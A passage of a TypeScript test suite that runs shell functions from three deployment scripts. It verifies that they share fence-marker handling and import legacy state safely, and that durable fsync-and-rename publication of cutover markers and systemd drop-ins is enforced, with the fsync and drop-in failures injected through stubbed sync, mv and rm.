    'publish_trust_root_candidates',
    'pin_publish_root_parent',
    'publish_root_anchored',
    'publish_trust_root',
    'refuse_symlinked_root',
    'pin_dir_beneath_root',
    'publish_durable_file',
    'publish_durable_dropin',
    'marker_is_complete',
    'import_legacy_file',
    'import_legacy_cutover_state',
    // o3d-secops r20: the marker's directory, the check that decides whether a marker may be
    // adopted at all, and the move out of ${CUTOVER_STATE_DIR}. A fence written by one entrypoint
    // and invisible to another is worse than the finding being fixed, so these three are held to
    // the same byte-for-byte rule as the publisher.
    'ensure_fence_marker_dir',
    'fence_marker_is_trustworthy',
    'import_relocated_fence_marker',
  ]) {
    const bodies = R9_SCRIPTS.map((entry) => shellFunction(entry.source, name))
    assert.equal(
      new Set(bodies).size,
      1,
      `${name}() has drifted between the entrypoints:\n${R9_SCRIPTS.map((e, i) => `--- ${e.name} ---\n${bodies[i]}`).join('\n')}`,
    )
  }

  // persist_stop_requested differs in exactly one thing: install.sh's writer is named
  // write_cutover_marker. Normalise that and the rest must be identical too.
  const stops = R9_SCRIPTS.map((entry) =>
    shellFunction(entry.source, 'persist_stop_requested').replaceAll('write_cutover_marker', 'write_fence_marker'),
  )
  assert.equal(new Set(stops).size, 1, `persist_stop_requested() has drifted:\n${stops.join('\n---\n')}`)
})

test('install.sh tells the operator to re-run the other two, and they read the marker it names', () => {
  const banner = INSTALL_LINES.filter((line) => /adopts? this fence|all three read this fence/.test(line)).join('\n')
  assert.match(banner, /deploy\.sh/, 'the banner must still name the other entrypoints')
  assert.match(
    INSTALL_SOURCE,
    /all three read this fence"\n\s*error\s+"\s*from the same place \(\$\{FENCE_FILE\}\) and adopt it\."/,
    'and it must name the file they actually read, rather than asserting an interoperability it did not have',
  )
  // The claim is only true because ${FENCE_FILE} resolves identically in all three, which the
  // namespace test above asserts. Named here so the two are not read as independent.
  assert.equal(
    new Set(R9_SCRIPTS.map((entry) => assignment(entry.source, 'FENCE_FILE'))).size,
    1,
    'and that sentence is a lie unless FENCE_FILE is one path everywhere',
  )
})

// Every ordered pair: a marker written by one entrypoint, adopted by another.
const CROSS_STOPPING_STATE = ['CUTOVER_ARMING=true', 'FENCE_ARMED=true', 'FENCE_MASK=true', 'SCHEMA_TOUCHED=true'].join('\n')

for (const writerEntry of R8_CASES) {
  for (const adopterEntry of R8_CASES) {
    test(`a fence left by ${writerEntry.name} is adopted by ${adopterEntry.name}`, () => {
      // THE RUNBOOK, EXECUTED. The marker is produced by the first script's own writer and
      // consumed by the second script's own adoption — no fixture text in between, so a
      // divergence in either would show up here.
      const marker = runMarkerWriter(writerEntry, CROSS_STOPPING_STATE)
      assert.match(marker, /^phase=stopping$/m, `${writerEntry.name} must record the stop it made`)
      assert.match(marker, /^marker_complete=1$/m, 'and publish it complete')

      const result = runAdoption(adopterEntry, marker, 'PREDECESSOR_ACTIVE=true')
      assert.equal(result.status, 0, `${adopterEntry.name} must adopt it cleanly:\n${result.stdout}`)
      assert.match(result.log, /systemctl stop/, `${adopterEntry.name} must re-stop what ${writerEntry.name} stopped`)
      assert.match(result.log, /install_reboot_fence/, 'and re-establish the reboot fence')
      assert.ok(
        !/release_db_connections/.test(result.log),
        `and must NOT release a fence ${writerEntry.name} was right to leave standing: ${result.log}`,
      )
      assert.match(result.stdout, /AFTER_SCHEMA_TOUCHED=true/, 'the migration attempt must survive the hand-off')
      assert.equal(result.markerExists, true, 'and the marker stays: the adopter owns the fence now')
    })
  }
}

// ---------------------------------------------------------------------------
// The legacy namespace: state left by a checkout that predates the shared one.
// ---------------------------------------------------------------------------

const R9_LEGACY_STATE = `
LEGACY_CUTOVER_STATE_DIR="\${CUTOVER_STATE_DIR}/legacy"
LEGACY_FENCE_FILE="\${LEGACY_CUTOVER_STATE_DIR}/FENCED"
LEGACY_CRON_BACKUP="\${LEGACY_CUTOVER_STATE_DIR}/crontab-appuser.bak"
LEGACY_DB_FENCE_STATE="\${LEGACY_CUTOVER_STATE_DIR}/db-connect-fence.json"
mkdir -p "\${LEGACY_CUTOVER_STATE_DIR}"
printf 'phase=stopping\\nmigration_attempted=true\\nschema_touched=true\\n' > "\${LEGACY_FENCE_FILE}"
printf '*/5 * * * * /usr/bin/true\\n' > "\${LEGACY_CRON_BACKUP}"
printf '{"grants":[]}\\n' > "\${LEGACY_DB_FENCE_STATE}"
chown(){ :; }
`

for (const entry of R9_SCRIPTS) {
  test(`${entry.name} imports a fence left at deploy.sh's pre-r9 paths before it adopts anything`, () => {
    const result = runR9(
      entry,
      ['fsync_path', 'publish_durable_file', 'ensure_cutover_state_dirs', 'import_legacy_file', 'import_legacy_cutover_state'],
      [
        'import_legacy_cutover_state',
        'echo "MARKER=$(cat "${FENCE_FILE}" 2>/dev/null | tr "\\n" ";")"',
        'echo "CRON=$(cat "${CRON_BACKUP}" 2>/dev/null)"',
        'echo "DBSTATE=$(cat "${DB_FENCE_STATE}" 2>/dev/null)"',
        '[[ -e "${LEGACY_FENCE_FILE}" ]] && echo LEGACY_MARKER_REMAINS || echo LEGACY_MARKER_MOVED',
        '[[ -e "${LEGACY_DB_FENCE_STATE}" ]] && echo LEGACY_DBSTATE_REMAINS || echo LEGACY_DBSTATE_GONE',
      ].join('\n'),
      R9_LEGACY_STATE,
    )

    assert.equal(result.status, 0, `the import must succeed:\n${result.stdout}`)
    assert.match(result.stdout, /MARKER=phase=stopping;/, `the marker must arrive at the shared path:\n${result.stdout}`)
    assert.match(result.stdout, /CRON=\*\/5 \* \* \* \* \/usr\/bin\/true/, 'and the crontab backup with it')
    // o3d-secops r23, Codex CRITICAL: THE CONNECTION-FENCE RECORD IS NOT ONE OF THEM ANY MORE.
    // It was written by the fence helper running as the service account, and republishing it into
    // the shared namespace made root build `GRANT CONNECT` out of statements that account
    // authored. It is reported and left exactly where it is.
    assert.match(result.stdout, /DBSTATE=$/m,
      `the legacy connection-fence record must NOT be imported:\n${result.stdout}`)
    assert.match(result.stdout, /IT HAS NOT BEEN READ, COPIED OR IMPORTED/,
      `and the operator must be told it is there and why it is being left alone:\n${result.stdout}`)
    assert.match(result.stdout, /LEGACY_DBSTATE_REMAINS/,
      `and it stays where it is, so it can still be read by hand:\n${result.stdout}`)
    assert.match(result.stdout, /LEGACY_MARKER_MOVED/, 'and nothing may be left at the old path for a later run to adopt twice')
  })

  test(`${entry.name} refuses to guess when both namespaces hold a fence`, () => {
    // Two interrupted runs, one in each namespace. Choosing between them would silently
    // discard a crontab backup or a set of recorded grants nothing else can reconstruct.
    const result = runR9(
      entry,
      ['fsync_path', 'publish_durable_file', 'ensure_cutover_state_dirs', 'import_legacy_file', 'import_legacy_cutover_state'],
      ['printf "phase=stopping\\n" > "${FENCE_FILE}"', 'import_legacy_cutover_state', 'echo REACHED_ADOPTION'].join('\n'),
      R9_LEGACY_STATE,
    )

    assert.notEqual(result.status, 0, `a run that cannot tell which fence is standing must stop:\n${result.stdout}`)
    assert.ok(!/REACHED_ADOPTION/.test(result.stdout), `and adopt nothing: ${result.stdout}`)
    assert.match(result.stdout, /DIE:.*Refusing to guess/, 'and say exactly what it refused')
    assert.match(result.stdout, /Nothing has been stopped/, 'and that nothing has happened yet')
  })

  test(`${entry.name} imports only what the legacy namespace actually holds`, () => {
    // A legacy directory that exists but is PARTIAL — a run that got as far as the crontab
    // backup and no further. The two artefacts that are not there must not be conjured: an
    // empty marker would be adopted as a fence, and an empty grants file would be "released"
    // over grants nobody recorded.
    const result = runR9(
      entry,
      ['fsync_path', 'publish_durable_file', 'ensure_cutover_state_dirs', 'import_legacy_file', 'import_legacy_cutover_state'],
      [
        'import_legacy_cutover_state',
        'echo "CRON=$(cat "${CRON_BACKUP}" 2>/dev/null)"',
        '[[ -e "${FENCE_FILE}" ]] && echo MARKER_INVENTED || echo NO_MARKER',
        '[[ -e "${DB_FENCE_STATE}" ]] && echo DBSTATE_INVENTED || echo NO_DBSTATE',
      ].join('\n'),
      [
        'LEGACY_CUTOVER_STATE_DIR="${CUTOVER_STATE_DIR}/legacy"',
        'LEGACY_FENCE_FILE="${LEGACY_CUTOVER_STATE_DIR}/FENCED"',
        'LEGACY_CRON_BACKUP="${LEGACY_CUTOVER_STATE_DIR}/crontab-appuser.bak"',
        'LEGACY_DB_FENCE_STATE="${LEGACY_CUTOVER_STATE_DIR}/db-connect-fence.json"',
        'mkdir -p "${LEGACY_CUTOVER_STATE_DIR}"',
        `printf '*/5 * * * * /usr/bin/true\\n' > "\${LEGACY_CRON_BACKUP}"`,
        'chown(){ :; }',
      ].join('\n'),
    )

    assert.equal(result.status, 0, `a partial legacy namespace must import cleanly:\n${result.stdout}`)
    assert.match(result.stdout, /CRON=\*\/5 \* \* \* \* \/usr\/bin\/true/, 'the one artefact present must arrive')
    assert.match(result.stdout, /NO_MARKER/, `and no marker may be invented from a file that is not there:\n${result.stdout}`)
    assert.match(result.stdout, /NO_DBSTATE/, 'nor a grants file')
  })

  test(`${entry.name} does nothing at all when there is no legacy namespace`, () => {
    // The overwhelmingly common case, and it must be silent and free.
    const result = runR9(
      entry,
      ['fsync_path', 'publish_durable_file', 'ensure_cutover_state_dirs', 'import_legacy_file', 'import_legacy_cutover_state'],
      [
        'import_legacy_cutover_state',
        '[[ -e "${CRON_BACKUP}" ]] && echo CRON_INVENTED || echo NO_CRON',
        '[[ -e "${DB_FENCE_STATE}" ]] && echo DBSTATE_INVENTED || echo NO_DBSTATE',
        'echo DONE',
      ].join('\n'),
      [
        'LEGACY_CUTOVER_STATE_DIR="${CUTOVER_STATE_DIR}/legacy"',
        'LEGACY_FENCE_FILE="${LEGACY_CUTOVER_STATE_DIR}/FENCED"',
        'LEGACY_CRON_BACKUP="${LEGACY_CUTOVER_STATE_DIR}/crontab-appuser.bak"',
        'LEGACY_DB_FENCE_STATE="${LEGACY_CUTOVER_STATE_DIR}/db-connect-fence.json"',
      ].join('\n'),
    )

    assert.equal(result.status, 0, `it must succeed:\n${result.stdout}`)
    assert.match(result.stdout, /DONE/, 'and return')
    assert.ok(!/Imported/.test(result.stdout), `and claim no import: ${result.stdout}`)
    assert.equal(result.marker, null, 'and create no marker out of nothing')
    assert.match(result.stdout, /NO_CRON/, 'nor a crontab backup out of nothing')
    assert.match(result.stdout, /NO_DBSTATE/, 'nor a set of recorded grants out of nothing')
  })
}

// ---------------------------------------------------------------------------
// o3d-2sm1.5 (Codex r10) — VISIBILITY IS STILL NOT DURABILITY, ON THE OTHER SIDE OF THE
// BARRIER.
//
//   CRITICAL  docs/installation.md's "Manual equivalent" recreated the unsafe migration
//             window it exists to close: it published a COMPLETE marker saying
//             `schema_touched=false` and then invoked Prisma, and it fenced cron with a
//             comment rather than a command. An operator following it step by step ended in
//             exactly the state the scripts prevent. The recipe is gone; the test below is
//             what stops it coming back.
//   HIGH      publish_durable_file() renames BEFORE its last barrier, so a failed
//             parent-directory fsync returns non-zero with the new bytes already visible at
//             the authoritative path. mark_schema_touched() and persist_stop_requested()
//             discarded that result with `|| true` and validated the visible replacement
//             with grep — which the renamed bytes satisfy. Migration and stopping went
//             ahead over a publication whose directory entry a power loss could undo,
//             restoring the previous complete marker.
//
// AND THE ROUND-9 COVERAGE PROVED THE RIGHT PROPERTY ON THE WRONG SIDE OF THE BARRIER: it
// injected a chmod failure, which happens BEFORE the rename, where nothing is visible and
// the read-back correctly fails. Every test below states which side it injects on.
// ---------------------------------------------------------------------------

/**
 * FAILURE INJECTED ON THE POST-RENAME SIDE OF THE BARRIER.
 *
 * BARRIER 1 (`fsync_path "$tmp"`, before the rename) succeeds. The rename succeeds. Only
 * BARRIER 2 — the parent-directory flush that publish_durable_file() performs AFTER the
 * rename — fails, together with the bare-`sync` fallback fsync_path tries next, without
 * which fsync_path would report success and there would be no failure to observe.
 *
 * So at the instant the caller must decide, the NEW marker is fully visible at the
 * authoritative path and its directory entry is not proven durable. Any caller that greps
 * the file is satisfied; only the publisher's return value tells the truth. That is the
 * exact instant Codex named, and it is the one the chmod shim could not reach.
 */
const R10_POST_RENAME_BARRIER_SHIM = `
sync(){
  # o3d-czpy r2: the POST-RENAME barrier is now \`sync ..\` from inside the staging directory, so
  # the operand is matched by the directory it RESOLVES to and not by its spelling.
  if [[ $# -eq 0 ]]; then return 1; fi
  local _p
  _p="\$(cd "\${1}" 2>/dev/null && pwd -P)" || _p=""
  if [[ -n "\${_p}" && "\${_p}" == "\$(cd "\${CUTOVER_STATE_DIR}" && pwd -P)" ]]; then return 1; fi
  command sync "\$@"
}
`

for (const entry of R9_SCRIPTS) {
  test(`${entry.name} refuses to migrate when the POST-RENAME barrier fails, though the marker is visible`, () => {
    const result = runR9(
      entry,
      ['fsync_path', 'publish_durable_file', entry.writer, 'mark_schema_touched'],
      ['mark_schema_touched', 'echo REACHED_THE_MIGRATION'].join('\n'),
      [R10_POST_RENAME_BARRIER_SHIM, 'FENCE_ARMED=true'].join('\n'),
    )

    // THE PRECONDITION, PROVED RATHER THAN ASSUMED. Without this the test could pass for the
    // wrong reason — a publication that failed before the rename, where there is nothing to
    // read back and the old `|| true` + grep would also have refused. The rename HAPPENED:
    // the new marker is at the authoritative path, complete, and says the very thing the
    // read-back looks for.
    assert.ok(result.marker !== null, `the rename must have published the new marker: ${result.files.join(', ')}`)
    assert.match(result.marker ?? '', /^schema_touched=true$/m, 'and it must say exactly what the grep looks for')
    assert.match(result.marker ?? '', /^marker_complete=1$/m, 'as a complete marker, so nothing else could have refused it')

    // AND THE REFUSAL, which at this instant can only come from the publisher's return value.
    assert.notEqual(result.status, 0, `an unprovable publication must abort the migration:\n${result.stdout}`)
    assert.ok(!/REACHED_THE_MIGRATION/.test(result.stdout), `and nothing after it may run:\n${result.stdout}`)
    assert.match(result.stdout, /DIE:.*durably before migrating/, `and it must say what it refused and why:\n${result.stdout}`)
  })

  test(`${entry.name} refuses to stop when the POST-RENAME barrier fails, though the marker is visible`, () => {
    const result = runR9(
      entry,
      ['fsync_path', 'publish_durable_file', entry.writer, 'persist_stop_requested'],
      ['FENCE_ARMED=true', 'persist_stop_requested', 'echo REACHED_THE_STOP'].join('\n'),
      R10_POST_RENAME_BARRIER_SHIM,
    )

    // Same precondition, same side of the barrier: the transition is VISIBLE on disk.
    assert.ok(result.marker !== null, `the rename must have published the new marker: ${result.files.join(', ')}`)
    assert.match(result.marker ?? '', /^phase=stopping$/m, 'and it must say exactly what the grep looks for')
    assert.match(result.marker ?? '', /^marker_complete=1$/m, 'as a complete marker, so nothing else could have refused it')

    assert.notEqual(result.status, 0, `an unprovable transition must abort the stop:\n${result.stdout}`)
    assert.ok(!/REACHED_THE_STOP/.test(result.stdout), `and nothing after it may run:\n${result.stdout}`)
    assert.match(result.stdout, /DIE:.*durably before stopping/, `and it must say what it refused and why:\n${result.stdout}`)
  })
}

test('neither critical transition substitutes a read-back for the publisher’s durability result', () => {
  // The behavioural tests above are the proof; this is the shape that made the defect
  // possible, named so it cannot return in a different spelling. The grep must SURVIVE — it
  // answers a real and separate question, "is this the marker we meant to write?" — but it
  // may never be the only gate.
  for (const entry of R9_SCRIPTS) {
    for (const fn of ['mark_schema_touched', 'persist_stop_requested']) {
      const body = shellFunction(entry.source, fn)
      const publishCall = body.split('\n').find((line) => new RegExp(`^\\s*${entry.writer}\\s`).test(line))
      assert.ok(publishCall, `${entry.name}: ${fn}() must publish the marker`)
      assert.ok(
        !/\|\|\s*true\s*$/.test(publishCall as string),
        `${entry.name}: ${fn}() discards the publisher's result: ${publishCall}`,
      )
      assert.match(
        publishCall as string,
        /\|\|\s*die\b/,
        `${entry.name}: ${fn}() must treat a failed publication as fatal: ${publishCall}`,
      )
      assert.match(body, /grep -qE/, `${entry.name}: ${fn}() must still confirm WHAT landed, as an additional gate`)
    }
  }
})

test('docs/installation.md offers no hand-run cutover, only the shipped entrypoints', () => {
  // THE UNDER-IMPLEMENTED RUNBOOK IS THE DEFECT. Every earlier round found documentation
  // that OVERCLAIMED; this one under-implemented, which is worse — an operator follows it
  // and lands in the state the scripts exist to prevent. A copy-pasteable cutover cannot be
  // made equivalent without reimplementing publish_durable_file(), the completeness
  // sentinel, the arming/stopping transitions, the cron backup's ownership flag, the lock,
  // adoption and the exit-trap unwind. So the doc no longer offers one, and this test is the
  // thing that keeps it from being helpfully re-added.
  const doc = readFileSync(join(process.cwd(), 'docs/installation.md'), 'utf8')
  const blocks = [...doc.matchAll(/```[a-z]*\n([\s\S]*?)```/g)].map((match) => match[1])
  assert.ok(blocks.length > 0, 'precondition: the runbook has fenced command blocks to inspect')

  for (const block of blocks) {
    assert.ok(
      !/prisma migrate deploy/.test(block),
      `no command block may invoke the migration by hand — it is the step whose ordering the cutover exists to enforce:\n${block}`,
    )
    assert.ok(
      !/DEPLOY-FENCED/.test(block),
      `nor hand-write the cutover marker: a shell redirection is neither atomic nor flushed, and publish_durable_file() is not expressible in a runbook:\n${block}`,
    )
    assert.ok(
      !/zz-deploy-fence\.conf/.test(block),
      `nor hand-install the reboot fence, whose drop-in must be verified as loaded before anything stops:\n${block}`,
    )
    assert.ok(
      !/fence-db-connections\.mjs/.test(block),
      `nor hand-drive the connection fence, whose release is gated on schema_touched:\n${block}`,
    )
  }

  // AND THE POSITIVE HALF: it must still tell the operator what to run, or "no manual
  // recipe" is just a gap. Without this, deleting the whole Updating section would pass.
  assert.match(doc, /bash scripts\/update\.sh/, 'the runbook must name the supported update path')
  assert.match(doc, /no manual equivalent/i, 'and say plainly that hand-rolling it is not supported')
  assert.match(
    doc,
    /`scripts\/install\.sh`, `scripts\/update\.sh`, `scripts\/deploy\.sh`/,
    'and point at all three entrypoints, since a fence left by any of them is adopted by any other',
  )
})

// ---------------------------------------------------------------------------
// o3d-2sm1.5 (Codex r11) — THE OTHER HALF OF THE FENCE WAS NEVER FLUSHED.
//
//   CRITICAL  install_reboot_fence() published the marker through publish_durable_file()
//             and then wrote the systemd drop-in with a plain `cat > "$dropin"` into a
//             `mkdir -p`'d directory, chmod 644, daemon-reload, verify. daemon-reload and
//             `systemctl show -p DropInPaths` prove only that systemd can read the drop-in
//             NOW. Execution then stops the services and migrates, with no write barrier
//             anywhere in between — the deferral's claim that "the writeback window ends
//             before anything is stopped" is not established by that ordering. A power cut
//             after `schema_touched` is durable but before the drop-in reaches the medium
//             reboots without the AssertPathExists=! fence: the durable marker names a
//             condition no unit asserts on, and the old enabled service starts against a
//             partially migrated schema.
//
// The fix is publish_durable_dropin(), which adds the barrier publish_durable_file() cannot
// give — the NEW `<unit>.d` directory's own entry in /etc/systemd/system — to the two it
// already has. The tests below run the shipped function and the shipped
// install_reboot_fence(), and each states WHICH SIDE OF WHICH BARRIER it injects on.
// ---------------------------------------------------------------------------

const R11_FENCE_CASES = [
  { name: 'deploy.sh', source: DEPLOY_LINES.join('\n') },
  { name: 'update.sh', source: UPDATE_LINES.join('\n') },
  { name: 'install.sh', source: INSTALL_SOURCE },
] as const

/**
 * The reboot-fence installer, running for real, over a temporary /etc/systemd/system.
 *
 * Only the things that are NOT under test are stubbed: the marker writer (its durability has
 * its own tests above), `systemctl`, and verify_reboot_fence() — whose appearance in the
 * output is itself an assertion, because a refusal that reaches the verify has happened too
 * late. publish_durable_dropin(), rollback_reboot_fence_install() and install_reboot_fence()
 * are the shipped text.
 *
 * `rm` is shimmed to SNAPSHOT the drop-in the instant before the rollback deletes it. That
 * is what makes the precondition observable: without it the rollback erases the evidence
 * that the rename had already published a complete, systemd-readable drop-in at the
 * authoritative path, and the test could then pass for a publication that failed EARLIER —
 * the wrong side of the barrier, where a read-back would also have refused.
 */
function runR11(
  entry: (typeof R11_FENCE_CASES)[number],
  extra = '',
): { stdout: string; status: number; dropinExists: boolean; snapshot: string | null; barriers: string[] } {
  const dir = mkdtempSync(join(tmpdir(), 'ims-r11-'))
  const systemdRoot = join(dir, 'etc-systemd-system')
  const dropin = join(systemdRoot, 'app.service.d', 'zz-deploy-fence.conf')
  const snapshot = join(dir, 'dropin-at-refusal')
  try {
    const preamble = `
set -euo pipefail
DRY_RUN=false
BLUE=''; GREEN=''; YELLOW=''; RED=''; BOLD=''; RESET=''
STATE_DIR='${dir}'
DATA_DIR='${dir}'
CUTOVER_STATE_DIR='${dir}'
FENCE_FILE="\${CUTOVER_STATE_DIR}/DEPLOY-FENCED"
BARRIERS="\${CUTOVER_STATE_DIR}/barriers.log"
SNAPSHOT='${snapshot}'
SYSTEMD_ROOT='${systemdRoot}'
FENCE_DROPIN_NAME=zz-deploy-fence.conf
FENCE_DROPIN_DIR="\${SYSTEMD_ROOT}/app.service.d"
FENCE_DROPIN_FILE="\${FENCE_DROPIN_DIR}/\${FENCE_DROPIN_NAME}"
DROPIN="\${FENCE_DROPIN_FILE}"
DROPIN_DIR="\${FENCE_DROPIN_DIR}"
SERVICE_UNIT=app.service
SERVICE_UNITS=(app.service)
APP_NAME=app
APP_USER=appuser
APP_DIR=/opt/app
APP_DIR_REAL=/opt/app
FENCE_ARMED=false
FENCE_MARKER_PREEXISTED=false
FENCE_DROPIN_CREATED=false
FENCE_DROPINS_CREATED=()
REBOOT_FENCE_INSTALLED=false
command mkdir -p "\${SYSTEMD_ROOT}"
: > "\${BARRIERS}"
info(){ :; }
ok(){ :; }
success(){ :; }
warn(){ echo "WARN $*"; }
error(){ echo "ERR $*"; }
die(){ echo "DIE: $*" >&2; exit 1; }
systemctl(){ echo "systemctl $*" >> "\${BARRIERS}"; return 0; }
fence_dropin_file(){ echo "\${SYSTEMD_ROOT}/\$1.d/\${FENCE_DROPIN_NAME}"; }
write_fence_marker(){ printf 'reboot_fence=absent\\nmarker_complete=1\\n' > "\${FENCE_FILE}"; return 0; }
write_cutover_marker(){ write_fence_marker "\$@"; }
verify_reboot_fence(){ echo VERIFIED; return 0; }
# o3d-czpy r2: publish_durable_file() flushes its PINNED parent as \`..\` — the point of the fix
# is that it never names the destination again — so an operand that is a directory is recorded by
# the physical path it resolves to. A file operand (the temporary) is recorded verbatim, and the
# no-operand fallback stays distinguishable.
sync(){ local _p=""; if [[ -n "\${1:-}" ]]; then _p="\$(cd "\${1}" 2>/dev/null && pwd -P)" || _p=""; fi; echo "sync \${_p:-\$*}" >> "\${BARRIERS}"; command sync "\$@"; }
mv(){ echo "mv \$*" >> "\${BARRIERS}"; command mv "\$@"; }
rm(){
  local __a
  for __a in "\$@"; do
    if [[ "\${__a}" == "\${DROPIN}" && -f "\${__a}" ]]; then cp "\${__a}" "\${SNAPSHOT}"; fi
  done
  command rm "\$@"
}
`
    const program = [
      preamble,
      extra,
      ...['fsync_path', 'publish_durable_dropin', 'rollback_reboot_fence_install', 'install_reboot_fence'].map((name) =>
        shellFunction(entry.source, name),
      ),
      'RC=0',
      'install_reboot_fence "r11 under test" || RC=$?',
      'echo "RC=${RC}"',
      'echo "INSTALLED=${REBOOT_FENCE_INSTALLED}"',
      'if [[ "${RC}" -eq 0 ]]; then echo REACHED_THE_STOP; fi',
    ].join('\n')

    let stdout = ''
    let status = 0
    try {
      stdout = execFileSync('bash', ['-c', program], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] })
    } catch (error) {
      const err = error as { status?: number; stdout?: string; stderr?: string }
      status = err.status ?? -1
      stdout = `${err.stdout ?? ''}${err.stderr ?? ''}`
    }
    const barrierPath = join(dir, 'barriers.log')
    return {
      stdout,
      status,
      dropinExists: existsSync(dropin),
      snapshot: existsSync(snapshot) ? readFileSync(snapshot, 'utf8') : null,
      barriers: existsSync(barrierPath) ? readFileSync(barrierPath, 'utf8').split('\n').filter(Boolean) : [],
    }
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
}

/**
 * FAILURE INJECTED ON THE POST-RENAME SIDE OF BARRIER 2.
 *
 * The new drop-in directory's parent flush (BARRIER 0) succeeds, the temporary's own flush
 * (BARRIER 1) succeeds, the rename succeeds. Only the flush of the drop-in DIRECTORY that
 * publish_durable_dropin() performs AFTER the rename fails — together with the bare-`sync`
 * fallback, without which fsync_path() would report success and there would be nothing to
 * observe.
 *
 * So at the instant the installer must decide, the drop-in is complete and readable at
 * /etc/systemd/system/<unit>.d/zz-deploy-fence.conf; a daemon-reload would load it and
 * `systemctl show -p DropInPaths` would report it. Only the publisher's return value knows
 * that the directory entry is not proven durable. That is the exact instant the CRITICAL
 * names, and no read-back, reload or verify can reach it.
 */
const R11_POST_RENAME_DROPIN_SHIM = `
sync(){
  echo "sync \$*" >> "\${BARRIERS}"
  if [[ \$# -eq 0 || "\${1}" == "\${DROPIN_DIR}" ]]; then return 1; fi
  command sync "\$@"
}
`

/**
 * FAILURE INJECTED ON BARRIER 0 — BEFORE ANY DROP-IN EXISTS.
 *
 * /etc/systemd/system/<unit>.d does not exist yet, so publish_durable_dropin() creates it and
 * must flush /etc/systemd/system to make that directory's own name durable. This shim fails
 * that flush and the bare-`sync` fallback. Nothing has been renamed and no drop-in is
 * visible: a file flushed into a directory whose entry was never flushed is published into
 * nothing, which is the failure publish_durable_file() could not have caught because it
 * assumes its directory already exists.
 */
const R11_NEW_DIRECTORY_SHIM = `
sync(){
  echo "sync \$*" >> "\${BARRIERS}"
  if [[ \$# -eq 0 || "\${1}" == "\${SYSTEMD_ROOT}" ]]; then return 1; fi
  command sync "\$@"
}
`

for (const entry of R11_FENCE_CASES) {
  test(`${entry.name} refuses the cutover when the drop-in's POST-RENAME barrier fails, though systemd could read it`, () => {
    const result = runR11(entry, R11_POST_RENAME_DROPIN_SHIM)

    // THE PRECONDITION, PROVED RATHER THAN ASSUMED. Without it this could pass for a
    // publication that failed before the rename — the side where nothing is visible and the
    // OLD code's daemon-reload/verify would have refused too.
    assert.ok(
      result.snapshot !== null,
      `the rename must have published the drop-in before the refusal:\n${result.stdout}\n${result.barriers.join(' | ')}`,
    )
    assert.match(
      result.snapshot ?? '',
      /^AssertPathExists=!.*DEPLOY-FENCED$/m,
      'and it must be the complete fence condition, so nothing about its CONTENT could have refused it',
    )

    // AND THE REFUSAL, which at this instant can only come from publish_durable_dropin()'s
    // return value.
    assert.match(result.stdout, /RC=1/, `an unprovable drop-in must fail the install:\n${result.stdout}`)
    assert.match(result.stdout, /INSTALLED=false/, `and no fence may be claimed:\n${result.stdout}`)
    assert.ok(!/REACHED_THE_STOP/.test(result.stdout), `and the caller's || die must fire:\n${result.stdout}`)

    // THE ROUTE. verify_reboot_fence() is stubbed to succeed and to announce itself, so its
    // absence proves the refusal happened at the publication and not at the verify — i.e.
    // before daemon-reload, before FENCE_ARMED, before persist_stop_requested and before the
    // first `systemctl stop`.
    assert.ok(
      !/VERIFIED/.test(result.stdout),
      `the refusal must precede the reload and the verify, not follow them:\n${result.stdout}`,
    )
    assert.equal(
      result.dropinExists,
      false,
      'and the rollback must remove the drop-in this call created, leaving no half-published fence',
    )
  })

  test(`${entry.name} refuses the cutover when the NEW drop-in directory cannot be made durable`, () => {
    const result = runR11(entry, R11_NEW_DIRECTORY_SHIM)

    // Precondition: the barrier that failed is the one for the directory, and it was reached
    // — the drop-in directory did not previously exist, so BARRIER 0 applies.
    assert.ok(
      result.barriers.some((line) => /^sync .*etc-systemd-system$/.test(line)),
      `the parent of a newly created drop-in directory must be flushed: ${result.barriers.join(' | ')}`,
    )
    assert.ok(
      !result.barriers.some((line) => /^mv /.test(line)),
      `and nothing may be renamed once it fails: ${result.barriers.join(' | ')}`,
    )

    assert.match(result.stdout, /RC=1/, `an unprovable drop-in directory must fail the install:\n${result.stdout}`)
    assert.match(result.stdout, /INSTALLED=false/, `and no fence may be claimed:\n${result.stdout}`)
    assert.ok(!/VERIFIED/.test(result.stdout), `and the refusal must precede the verify:\n${result.stdout}`)
    assert.equal(result.dropinExists, false, 'and no drop-in may be left at the authoritative path')
  })

  test(`${entry.name} publishes the drop-in with the same three barriers, in order, before it reloads systemd`, () => {
    // THE ORDERING IS THE PROPERTY, observed rather than read out of the source. Data flushed
    // after the rename publishes a name whose content is not on the medium; a directory never
    // flushed loses the name; and a `<unit>.d` whose own entry was never flushed loses both.
    const result = runR11(entry)
    assert.match(result.stdout, /RC=0/, `the install must succeed on the happy path:\n${result.stdout}`)

    const parentBarrier = result.barriers.findIndex((line) => /^sync .*etc-systemd-system$/.test(line))
    const dataBarrier = result.barriers.findIndex((line) => /^sync .*zz-deploy-fence\.conf\.\w+$/.test(line))
    const rename = result.barriers.findIndex((line) =>
      /^mv -f .*zz-deploy-fence\.conf\.\w+ .*app\.service\.d\/zz-deploy-fence\.conf$/.test(line),
    )
    const dirBarrier = result.barriers.findIndex((line) => /^sync .*app\.service\.d$/.test(line))
    const reload = result.barriers.findIndex((line) => /^systemctl daemon-reload$/.test(line))

    assert.notEqual(parentBarrier, -1, `BARRIER 0 must flush the new directory's parent: ${result.barriers.join(' | ')}`)
    assert.notEqual(dataBarrier, -1, `BARRIER 1 must flush the temporary: ${result.barriers.join(' | ')}`)
    assert.notEqual(rename, -1, `the drop-in must be published by rename: ${result.barriers.join(' | ')}`)
    assert.notEqual(dirBarrier, -1, `BARRIER 2 must flush the drop-in directory: ${result.barriers.join(' | ')}`)
    assert.notEqual(reload, -1, `and systemd must then be reloaded: ${result.barriers.join(' | ')}`)

    assert.ok(parentBarrier < dataBarrier, `the directory's own entry is flushed first: ${result.barriers.join(' | ')}`)
    assert.ok(dataBarrier < rename, `the data barrier must precede the rename: ${result.barriers.join(' | ')}`)
    assert.ok(rename < dirBarrier, `and the directory barrier must follow it: ${result.barriers.join(' | ')}`)
    assert.ok(dirBarrier < reload, `and ALL of it must precede the reload: ${result.barriers.join(' | ')}`)
  })
}

test('no entrypoint writes its reboot-fence drop-in with a bare redirection', () => {
  // The behavioural tests above are the proof; this is the shape that made the defect
  // possible, named so it cannot come back in a different spelling — including at the exit
  // trap's re-install, which shares install_reboot_fence().
  for (const entry of R11_FENCE_CASES) {
